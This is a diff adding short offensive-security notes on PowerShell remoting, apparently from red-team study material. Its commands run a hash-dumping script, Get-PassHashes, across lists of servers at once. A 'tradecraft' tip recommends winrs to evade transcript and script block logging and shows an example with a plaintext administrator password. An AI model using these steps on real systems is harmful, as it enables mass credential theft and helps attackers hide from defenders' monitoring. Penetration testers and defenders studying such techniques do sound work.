@@ -1,0 +1,31 @@
+--POWERSHELL REMOTING--
+
+<b>::: USE BELOW TO EXECUTE COMMANDS OR SCRIPTBLOCKS</b>
+
+PS> Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content [list_of_servers])
+
+<b>::: USE BELOW TO EXECUTE SCRIPTS FROM FILES</b>
+
+PS> Invoke-Command –FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content [list_of_servers])
+
+<b>::: USE BELOW TO EXECUTE LOCALLY LOADED FUNCTION ON THE REMOTE MACHINES</b>
+
+PS> Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content [list_of_servers])
+
+<b>::: PASSING ARGUMENTS: only possitional arguments could be passed this way</b>
+
+PS> Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content [list_of_servers]) -ArgumentList
+
+<b>::: USE BELOW TO EXECUTE "stateful" COMMANDS USING (Invoke-Command)</b>
+
+PS> $Sess = NEw-PSSession -Computername [hostname]
+Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}
+Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
+
+--POWERSHELL REMOTING TRADECRAFT--
+
+- supports the system-wide transcripts and deep script block logging
+
+TIP: We can use winrs in place of PSRemoting to evade the logging and still reap the benefit of 5985 allowed between hosts
+ 
+PS> winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
